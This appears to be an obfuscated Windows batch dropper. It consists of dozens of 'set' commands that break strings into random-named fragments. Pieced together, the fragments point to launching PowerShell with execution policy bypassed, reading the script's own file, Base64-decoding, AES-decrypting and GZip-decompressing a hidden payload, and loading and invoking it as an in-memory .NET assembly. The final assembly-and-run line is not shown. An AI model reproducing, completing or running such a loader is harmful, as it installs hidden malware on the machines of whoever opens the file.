@echo off
set "YiwUOYOMHS=ll"
set "znbUIsstoX=po"
set "fvtvuwcibC=:\"
set "aIYIPoZINN=rS"
set "UNFcRiJAjs=py"
set "WyafSNCHRI=em"
set "wCCumuSxWg=he"
set "LSdBfgxCSf=st"
set "vPeQEqIIAZ=Wi"
set "oboOPFKjfz=nd"
set "ecGXrTcHwh=we"
set "sPETJoxXBQ=\W"
set "auIhozSOCV=.e"
set "pFfbZICese=Po"
set "VctnfoWGyd=co"
set "ITrFybvOsu=1."
set "avKYMhTgwE=ws"
set "qWzlgeRRvN=we"
set "FcHRFXtLXO=he"
set "worBYzukIu=ow"
set "skEnDnfcST=32"
set "ArJIjRleUR=0\"
set "JcAudDSxCe=ll"
set "JKHzUyjdwV=in"
set "CzMXwBnPYS=do"
set "CZumsNCbeM=rs"
set "emJoDHGwmL=\v"
set "WjipIegEFO=Sy"
set "WqrjiFSIoX= C"
set "QroCBOteZL=xe"
set "VezaLcTvgM=y "
set "muUpdAzZiO= /"
set "gByHXgmAFR=s\"
set "MMjSejgLWw= %~dp0"
set "QkHIhGuraz=cd"
set "HIGzoGgxSp=y.Pa"
set "HkdvSZkzUh=ion."
set "seeiTjLJdw=AY ="
set "yxScyLnTuc=.Ass"
set "svntxZaoRm=awV."
set "zjRYWDNzop=('%*'"
set "hvcpZAxxyv=OnNs"
set "ondLnbCmQJ=d;$s"
set "PuAOhgWayg=FcNh"
set "drjDFbmtAc=em.C"
set "XwcwpElrAX=wCUz"
set "lLBbclgKqN=ptor"
set "wlrrslzdQk=kyhK"
set "AgMmjqMfGv=tS46"
set "xQCqQplwbk=ress"
set "RENiosJOES=grap"
set "DpdcPhpTWL=stem"
set "yJVDHmwxNf=J = "
set "gRfXwtPByR=comp"
set "IXWYawYAdJ===')"
set "IoywVizuiK=Obje"
set "gZmRnIIBbd=R5jf"
set "lhXSXTaaKt=('%~f0'"
set "DvqgyKtZjM=('da"
set "BBqqsHskQe=::De"
set "bkeGIuESPu=ach "
set "PhYtpIAlZH=1] -"
set "HWLJAVpdYi=sTmJ"
set "yZXYUxTyNS=PKCS"
set "OHiqACbfRe=ispo"
set "vZEfcDhSoq=Star"
set "hCBfZnSZKA=HO3I"
set "Qlrtzbypcs= [Sy"
set "fjIoqOOTrS=pres"
set "vxMqvgiplc=m.IO"
set "pNqsfsLwLI=tem."
set "zzIBXKlVxW=$zvw"
set "gjqLpjgCoF=ke($"
set "VfLnBbvzSt=gnir"
set "nmElLhetTC=nage"
set "hCccneXXLd=ByhM"
set "SRkXqxdcqW= = ["
set "NRwRtunLVL=Conv"
set "SpkoYSCXWk=ddin"
set "DVtdAznRqi=saBm"
set "UGajitlVVS=::('"
set "nOhozoEGYU=-4] "
set "sIAuMLfRQv=S46e"
set "MSBhUYcIDw=y.Cr"
set "WUrgWJpyrf=Stre"
set "YgSWUpIwmV=)))"
set "XjNRfQOWnJ=lBlo"
set "LloTAnSKYy=[]] "
set "mOUUbsvYWn=Fina"
set "ojsIYoRIZA=Wyqo"
set "ZSwBcUvoNo=);$z"
set "fwLUXBPOel=gQ ="
set "jmjrIRYBiK=hy.A"
set "uTAXRpKdPl=rity"
set "OmicJFphJi=em.I"
set "NOnopNUNZS='[-1"
set "CYUVzTFwyC=urit"
set "iMujKBZuAM=vert"
set "OISyKZXGNT=]::N"
set "vaBqBhzbbo=awV "
set "ripyjISVBw=Syst"
set "dqnbjanhqM=oryS"
set "PhFAtbesHU=, $E"
set "JHExvignjn=);$s"
set "wmrCsKhutN=daeR"
set "BWGUqgTyGN=Disp"
set "WDEhzNyPMn=[Sys"
set "KJODfmTxrW=$TDa"
set "RqrPrRPXmv=orF'"
set "jrQdQAPszu=morF"
set "XLOZAanvfm=ddin"
set "KfUsbjiMKT=ecry"
set "AuGlIwwLxS=join"
set "wLzCcDGvTO=Bmor"
set "HAanglGDpi=]::C"
set "lJZNFhRmJa=esaB"
set "RTtZrInkqC=DNJS"
set "mhFBCEBsLn=THxh"
set "HoXdRGgZoI=brea"
set "IOmAsjhUVp=6esa"
set "vSqFMQKXLq=, (,"
set "AzpgwmOxZH=pStr"
set "xbwCUWcEaC=trea"
set "fRvjLsdiqC=yste"
set "XXyPqRuerk=ateD"
set "ZOhbmhydWH=tsWi"
set "lUUmyPnTeZ=TllA"
set "tEgYpVnjYu='gni"
set "ReFSJzXJdD=onve"
set "wrpWrIJijI=ode]"
set "wgoXGuomKV=wV.T"
set "SlxDTdJlcw=.Cry"
set "vPQWKqryNG=.-16"
set "roYtTRhoxw=eam("
set "EuHGnjPCmH=gth)"
set "FmIhVOOZeN=-ep "
set "zQyNVIjMnX=stem"
set "etpKQcaNMW=.IO."
set "RDKhpaYAyp=Nsq."
set "psiRyhjIUu=;$YB"
set "RqooCBdqGd=-1.."
set "jOOpwEIPAP=oL'["
set "QKHxrANjwT=$rwC"
set "AdxCSLwnZz=null"
set "ZtGeREwQoR=ptog"
set "QFZnKsqGMJ=ct S"
set "QcdBrIjWlc=hp, "
set "nziQnYRSAe=iron"
set "yjuNUYATtR=WduK"
set "CotMNKMrWF=tryP"
set "KVNwEzroXH=embl"
set "venOqJAoPh=ptog"
set "JSSfwlKfdX=[Env"
set "GOvXXlTKye=rwCU"
set "OSPsryPiGp=Y) {"
set "eKjLviqIon=);$r"
set "TTOXcMpXQy=gMod"
set "trgOSHEQsz=Secu"
set "NwXllerPyG=oint"
set "XoudFWIYFA=.Mod"
set "aFpsEmUTvD=();$"
set "QPgrIhziLN=.Len"
set "FTNdlfIdkL=]::("
set "NFHGwoetgJ=e = "
set "vmRdDWeukR=ne);"
set "CietLQuvtB=esMa"
set "ZWtBwvxyLf=y]::"
set "ofGcKgrGCc=ose("
set "gNHvGbauDT=$Poc"
set "sIpCOyDjJp=;$GT"
set "SPLkfgumTV=).Sp"
set "URNrsAbsOR='txe"
set "pEGkttLDbB=q.Su"
set "tfTnrcgfNt=ing("
set "SIqbeBkNfT=Obje"
set "tZmOqFPkam=);$Y"
set "McaJmLIyzT=yhM."
set "hfWFgVygGS=and "
set "yovASInDiR=t Sy"
set "rabxGeLIzy=n ''"
set "rEloEbvJUW=ss -"
set "yHssygbcOB=Disp"
set "xAvhbVUsRT=.Dis"
set "fkueftSZEu= = $"
set "KMpzKfnBgZ=();$"
set "mlEfOOsQbT=);$s"
set "rDYaXXwNgX= = N"
set "qvcGIlZZQW=EfHa"
set "cUXhvfPKnw=.Con"
set "wdJoUqsDYo=Syst"
set "DpDvcLURvw=m(, "
set "TdatiFHKgn=fore"
set "TRrlONSIXQ=[Sys"
set "BhthTmjvnO=CuSj"
set "GtIVLshcxm=p = "
set "GctgzuGzQi=)($E"
